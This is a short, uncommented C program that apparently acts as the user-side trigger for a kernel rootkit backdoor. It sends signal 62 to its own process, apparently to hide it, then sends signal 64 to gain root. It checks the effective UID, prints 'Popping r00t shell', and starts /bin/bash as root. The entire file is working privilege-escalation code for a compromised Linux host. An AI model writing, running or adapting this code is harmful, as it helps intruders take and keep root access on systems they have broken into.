#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>   

int main(){
  pid_t pid = getpid();
  char buf[32];
  memset(buf, '\0', 32);
  snprintf(buf, 32, "kill -62 %d", pid);
  printf("%s\n", buf);
  system(buf);

  setuid(12345);
  uid_t ID;
  uid_t EID;

  ID = getuid();
  EID = geteuid();
  printf("[+] UID = %hu\n[+] EUID = %hu\n",ID,EID);

  system("kill -64 0");
  ID = getuid();
  EID = geteuid();
  printf("[+] UID = %hu\n[+] EUID = %hu\n",ID,EID);
  if (EID == 0){
    printf("[!!!] Popping r00t shell!!!\n");
    system("/bin/bash");
  }
  return EXIT_SUCCESS;
}
